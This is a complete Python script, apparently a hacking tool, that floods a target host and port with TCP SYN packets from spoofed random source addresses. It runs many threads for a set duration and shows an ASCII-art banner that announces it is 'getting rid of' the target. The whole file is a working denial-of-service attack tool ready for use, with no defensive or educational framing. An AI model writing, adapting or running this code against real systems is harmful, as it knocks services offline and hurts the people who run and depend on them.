#!/usr/bin/env python3
import sys, time, threading, socket
import random, string, os
from scapy.all import *
from urllib.parse import urlparse

_abort = False

def _ssyn(_ip):
    while _abort == False:
        try:
            _fraud = ".".join(str(random.randint(0, 255)) for _ in range(4))
            pkt = IP(dst=_ip, src=_fraud) / TCP(sport=RandShort(), dport=int(sys.argv[2]), flags="S")
            send(pkt, verbose=False)
        except:
            pass

def _rslv():
    _host = sys.argv[1].lower()
    if not (_host.startswith('http://') or _host.startswith('https://')):
        _host = "http://" + _host

    try:
        _domain = urlparse(_host).netloc
        _ip = socket.gethostbyname(_domain)
        return _domain, _ip
    except KeyboardInterrupt:
        sys.exit('\r\n DNS resolution failed!\r\n')

def main():
    if len(sys.argv) != 5:
        sys.exit('\r\n Usage: <target> <port> <time> <threading>\r\n')
        
    if not os.geteuid() == 0:
        sys.exit('\r\n Script requires root elevation!\r\n')

    _domain, _ip = _rslv()
    global _abort

    os.system('clear')
    print(''' "  "[    `M:_                                 .dMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
            "-[    "                          .dMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
                                             .dMMMMMMMMP"""""""""-\MMMMMMMMMMMMMMMMM
 b,_.dMMMMMMMb._                           .d<MMMMMMP"              "\MMMMMMMMMMMMMM
 MMMMMMMMMMMMMMM[                         .dMMMMMMMM"   ,=            "MMMMMMMMMMMMM
 MMMMMMMMMMMMMMMMIb.__                   OMMMMMMMMM   ,:"              `XMMMMMMMMMMM
 MMMMMMMMMMMMMMMMMMMMMM:                dMMMMMMMMP" _,;   __             "MMMMMMMMMM
 MMMMMMMMMMMMMMMMMMMMMP"               dMMMMMMMMM"_:MP"_dMMMP  , __        `MMMMMMMM
 MMMMMMMMMMMMMMMMMMP"                .dMMMMMMP"_.dMMMMMMMMM"   [_dMMb.     " ]MMMMMM
 MMMMMMMMMMMMMMMMMM                  UMMMMMP"_dMMMMMMMMMMMP     .dMMMM,     .dMMMMMM
 MMMMMMMMMMMMMMMMMP                 dMMMMMM   ;MMMMMMMMMMP"     :MMMMMb,    `TMMMMMM
 MMMMMMMMMMMMMMMMM"               _dMMMMMMK   `qMMMMXP""_.;      !MMMMMMb.   \MMMMMM
 MMMMMMMMMMMMMMMM[               :MMMMMMMM\         _.;P""       \MMMMMMM!,   QMMMMM
 MMMMMMMMMMMMMMMMM;             ,:MMMMMMMMb._  _.="""  _.o88o_    "QMMMMMMb.  "QMMMM
 MMMMMMMMMMMMMMMMMP             ]MMMMMMMMMMMMMMP     .dXMMMMMMb_    `"QMMMM/    `MMM
 MMMMMMMMMMMMMMMMP"             :MMMMMMMMMMMMMX,            `"b"              _.dMMM
 MMMMMMMMMMMMMMMb=_             ]MMMMMMMMMMMMV  .                  `;._     _dMMMMMM
  `"M.       VMP"                MMMMMMMMMMMMB_.`_ .dMMbo._          ``""xdMMMMMMMMM
     |        ||.                QMMMMMMMMMMMMM / .OMMMMMMMMD.          _.dMMMMMMMMM
     !        !|               _dMMMMMMMMMMMMMM  .dMMMMMMMMMMM;       .dMMMMMMMMMMMM
     |      |  |               dMMMMMMMMMMMMMMP .MMMMMMMMMMMMM;       dMMMMMMMMMMMMM
 ____|      |  |           _.odMMMMMMMMMMMMMMMM SMMMMMMMMMMMMP     ,odMMMMMMMMMMMMMM
 MMMMM      |  |,db.____.odMMMMMMMMMMMMMMMMMMMP `XMMMMMMMMMMP'   ,odMMMMMMMMMMMMMMMM
 MMMMM      |   MMMMMMMMMMMMMMMMMMMMMMMMMMMMMM; dMMMMMMMMMMP`  ,odMMMMMMMMMMMMMMMMMM
 MMMMM      |   MMMMMMMMMMMMMMMMMMMMMMMMMMMMMK dMMMMMMMMP""_,odMMMMMMMMMMMMMMMMMMMMM
 MMMMM      |   MMMMMMMMMMMMMMMMMMMMMMMMMMMMP :MMMMMMMM" ,odMMMMMMMMMMMMMMMMMMMMMMMM
 MMMMM!         MMMMMMMMMMMMMMMMMMMMMMMMMMMM" GMMMMMMMP .odMMMMMMMMMMMMMMMMMMMMMMMMM
 MMMMM!         MMMMMMMMMMMMMMMMMMMMMMMMMMMMb MMMMMMMP odMMMMMMMMMMMMMMMMMMMMMMMMMMM
 MMMMM!         MMMMMMMMMMMMMMMMMMMMMMMMMMMM; QMMMMM" dMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
 MMMMMb         MMMMMMMMMMMMMMMMMMMMMMMMMMMMb `QMMP dMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
 MMMMMMb        MMMMMMMMMMMMMMMMMMMMMMMMMMMMbo_,__odMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
 MMMMMMM\       MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
 MMMMMMMMb._    Q|MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM 
''')
    print(' Getting rid of ' + _ip + ":" + sys.argv[2] + ' for ' + sys.argv[3] + ' seconds...\r\n')

    tasks = []
    for x in range(0, int(sys.argv[4])):
        x = threading.Thread(target=_ssyn, args=(_ip,))
        tasks.append(x)
        x.start()
        
    _quit = time.time() + int(sys.argv[3])
    try:
        while time.time() <= _quit:
            pass
    except KeyboardInterrupt:
        pass
    
    _abort = True
    
    for y in tasks:
        y.join()
        
    sys.exit('\r\n Done!\r\n')

if __name__ == '__main__':
    main()
